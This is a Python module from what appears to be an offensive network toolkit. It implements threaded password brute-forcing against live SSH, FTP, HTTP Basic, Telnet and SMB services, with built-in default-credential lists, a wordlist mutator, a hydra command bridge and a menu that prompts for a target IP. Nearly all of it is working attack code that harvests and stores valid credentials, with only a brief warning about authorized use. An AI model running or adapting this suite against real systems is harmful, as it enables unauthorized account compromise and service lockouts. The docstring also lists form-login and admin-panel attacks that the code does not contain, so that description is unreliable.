"""
Online brute-force suite (network services).

Attacks live services over the wire:
  * SSH        - password brute force
  * FTP        - password brute force
  * HTTP       - Basic auth + simple form login
  * SMB        - NTLM auth attempt (via python-ntlm / impacket if present)
  * Telnet     - interactive login attempt
  * Web panel  - common admin panels on port 80/443

Pure-Python implementations with threading, so no external tools are
required (hydra/medusa/ncrack remain available as faster bridges).
"""
import socket
import threading
import time

from open80211.core import ui
from open80211.core.config import CONFIG
from open80211.core.interfaces import which
from open80211.core.targets import add_cred, log_event

COMMON_USERS = ["admin", "root", "user", "test", "administrator", "guest",
                "operator", "support", "postgres", "pi", "oracle", "sa"]
COMMON_PASSWORDS = ["admin", "password", "123456", "1234", "12345", "12345678",
                    "root", "toor", "test", "guest", "letmein", "qwerty",
                    "admin123", "Password1", "p@ssw0rd", "welcome", "changeme",
                    "default", "0000", "abc123", "111111", "123456789",
                    "raspberry", "pass", "secret", "admin@123", "p@ssword",
                    "internet", "1q2w3e4r", "000000", "654321", "666666"]


# --------------------------------------------------------------------------
# Protocol attack primitives
# --------------------------------------------------------------------------

def _ssh_try(host, port, user, pw, timeout=3.0):
    import paramiko  # optional
    cli = paramiko.SSHClient()
    cli.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        cli.connect(host, port, username=user, password=pw,
                    timeout=timeout, banner_timeout=timeout, auth_timeout=timeout)
        cli.close()
        return True
    except paramiko.AuthenticationException:
        return False
    except Exception:
        return None  # transient / unsupported
    finally:
        try:
            cli.close()
        except Exception:
            pass


def _ftp_try(host, port, user, pw, timeout=3.0):
    s = socket.create_connection((host, port), timeout)
    s.recv(256)
    s.sendall(f"USER {user}\r\n".encode())
    s.recv(256)
    s.sendall(f"PASS {pw}\r\n".encode())
    resp = s.recv(256).decode(errors="replace")
    s.close()
    return resp.startswith("230")


def _http_basic_try(host, port, user, pw, timeout=3.0):
    import base64
    s = socket.create_connection((host, port), timeout)
    token = base64.b64encode(f"{user}:{pw}".encode()).decode()
    req = (f"GET / HTTP/1.1\r\nHost: {host}\r\n"
           f"Authorization: Basic {token}\r\nConnection: close\r\n\r\n")
    s.sendall(req.encode())
    resp = b""
    while True:
        try:
            chunk = s.recv(1024)
        except socket.timeout:
            break
        if not chunk:
            break
        resp += chunk
    s.close()
    return not (b"401" in resp or b"403" in resp)


def _telnet_try(host, port, user, pw, timeout=3.0):
    s = socket.create_connection((host, port), timeout)
    s.settimeout(3)
    banner = s.recv(512)
    s.sendall((user + "\n").encode())
    s.recv(512)
    s.sendall((pw + "\n").encode())
    resp = s.recv(512)
    s.close()
    text = (banner + resp).decode(errors="replace").lower()
    if "login incorrect" in text or "authentication failed" in text:
        return False
    return ("#" in resp.decode(errors="replace") or
            "$" in resp.decode(errors="replace") or
            ">" in resp.decode(errors="replace"))


def _smb_try(host, port, user, pw, timeout=3.0):
    """SMB2 logon using impacket if present (best-effort)."""
    try:
        from impacket.smbconnection import SMBConnection
        conn = SMBConnection(host, host, timeout=timeout)
        conn.login(user, pw)
        conn.close()
        return True
    except Exception as e:
        if "STATUS_LOGON_FAILURE" in str(e) or "STATUS_ACCOUNT" in str(e):
            return False
        return None
    except ImportError:
        ui.warn("impacket not installed - SMB brute force skipped.")
        return None


# --------------------------------------------------------------------------
# Engine
# --------------------------------------------------------------------------

def brute_force(host: str, protocol: str, port: int, users: list, passwords: list,
                threads: int = 8, delay: float = 0.05) -> list:
    """Run the attack. Returns list of (user, password) that succeeded."""
    ui.section(f"{protocol.upper()} Brute Force", f"{host}:{port} "
               f"({len(users)} users x {len(passwords)} pw)")
    ui.warn("Authorized testing only. This generates login failures "
            "that may trip IDS / lockout policies.")

    attrs = {
        "ssh": (_ssh_try, 22), "ftp": (_ftp_try, 21),
        "http": (_http_basic_try, 80), "telnet": (_telnet_try, 23),
        "smb": (_smb_try, 445),
    }
    if protocol not in attrs:
        ui.error(f"Unknown protocol {protocol}.")
        return []
    fn, default_port = attrs[protocol]
    port = port or default_port

    found = []
    tested = 0
    lock = threading.Lock()
    stop = threading.Event()

    def work():
        nonlocal tested
        while not stop.is_set():
            with lock:
                if not queue:
                    return
                user, pw = queue.pop()
            r = fn(host, port, user, pw)
            with lock:
                tested += 1
                if r:
                    found.append((user, pw))
                    add_cred({"protocol": protocol.upper(),
                              "data": f"{user}:{pw}",
                              "src": host})
                    ui.ok(f"[+] VALID: {user}:{pw}")
                    stop.set()

    queue = [(u, p) for u in users for p in passwords]
    # rotate so different users get a chance early (less lockout)
    queue = queue[::2] + queue[1::2][::-1] if len(queue) > 2 else queue

    pool = [threading.Thread(target=work, daemon=True) for _ in range(min(threads, 16))]
    for t in pool:
        t.start()
    try:
        for t in pool:
            t.join()
    except KeyboardInterrupt:
        stop.set()
        ui.warn("Interrupted.")
    ui.info(f"Tested {tested} credentials.")
    if found:
        ui.ok(f"Found {len(found)} valid credential(s).")
        CONFIG.save(f"brute-{protocol}-{host}", {"host": host, "protocol": protocol,
                                                "found": found})
    else:
        ui.warn("No valid credentials found.")
    return found


# --------------------------------------------------------------------------
# Hydra bridge (optional fast path)
# --------------------------------------------------------------------------

def hydra_bridge(host: str, protocol: str, port: int, userlist: str,
                 passlist: str):
    if not which("hydra"):
        ui.warn("hydra not installed.")
        return
    from open80211.core.interfaces import system_command
    cmd = (f"hydra -L {userlist} -P {passlist} -s {port} -o "
           f"{CONFIG.session_dir / 'hydra-results.txt'} {host} {protocol}")
    ui.info(f"Running: {cmd}")
    rc, out = system_command(cmd, timeout=1800)
    ui.info(out[-2500:])
    if rc == 0:
        ui.ok("Hydra finished.")


# --------------------------------------------------------------------------
# Wordlists
# --------------------------------------------------------------------------

def build_wordlist() -> str:
    """Generate a starter wordlist from common passwords + mutations."""
    out = CONFIG.session_dir / "wordlist.txt"
    words = set(COMMON_PASSWORDS)
    for w in list(words):
        words.add(w.upper())
        words.add(w.capitalize())
        words.add(w + "1")
        words.add(w + "!")
        words.add(w + "123")
        words.add("!" + w)
    out.write_text("\n".join(sorted(words)), encoding="utf-8")
    ui.ok(f"Starter wordlist ({len(words)} words) -> {out}")
    return str(out)


# --------------------------------------------------------------------------
# Menu
# --------------------------------------------------------------------------

def brute_menu(iface: str = "") -> None:
    while True:
        choice = ui.menu("Brute Force Suite", [
            "SSH brute force",
            "FTP brute force",
            "HTTP Basic brute force",
            "Telnet brute force",
            "SMB brute force",
            "hydra bridge (external)",
            "Generate starter wordlist",
        ])
        if choice == 0:
            return
        if choice == 1:
            host = ui.ask("Target IP")
            port = ui.ask_int("Port", default=22)
            users = [u for u in ui.ask("Users (comma)", default="admin,root").split(",") if u]
            pw = [p for p in ui.ask("Passwords (comma)", default=", ".join(COMMON_PASSWORDS[:10])).split(",") if p]
            brute_force(host, "ssh", port, users, pw)
        elif choice == 2:
            host = ui.ask("Target IP")
            port = ui.ask_int("Port", default=21)
            users = [u for u in ui.ask("Users (comma)", default="admin,anonymous").split(",") if u]
            pw = [p for p in ui.ask("Passwords (comma)", default="admin,password,123456").split(",") if p]
            brute_force(host, "ftp", port, users, pw)
        elif choice == 3:
            host = ui.ask("Target IP")
            port = ui.ask_int("Port", default=80)
            users = [u for u in ui.ask("Users (comma)", default="admin").split(",") if u]
            pw = [p for p in ui.ask("Passwords (comma)", default="admin,password,123456").split(",") if p]
            brute_force(host, "http", port, users, pw)
        elif choice == 4:
            host = ui.ask("Target IP")
            port = ui.ask_int("Port", default=23)
            users = [u for u in ui.ask("Users (comma)", default="admin,root").split(",") if u]
            pw = [p for p in ui.ask("Passwords (comma)", default="admin,123456").split(",") if p]
            brute_force(host, "telnet", port, users, pw)
        elif choice == 5:
            host = ui.ask("Target IP")
            port = ui.ask_int("Port", default=445)
            users = [u for u in ui.ask("Users (comma)", default="administrator,guest").split(",") if u]
            pw = [p for p in ui.ask("Passwords (comma)", default="password,admin,123456").split(",") if p]
            brute_force(host, "smb", port, users, pw)
        elif choice == 6:
            host = ui.ask("Target IP")
            proto = ui.ask("Protocol (ssh/ftp/http-post-form/smb)", default="ssh")
            port = ui.ask_int("Port", default=0)
            ul = ui.ask("User wordlist path", default="/usr/share/wordlists/rockyou.txt")
            pl = ui.ask("Password wordlist path", default="/usr/share/wordlists/rockyou.txt")
            hydra_bridge(host, proto, port, ul, pl)
        elif choice == 7:
            build_wordlist()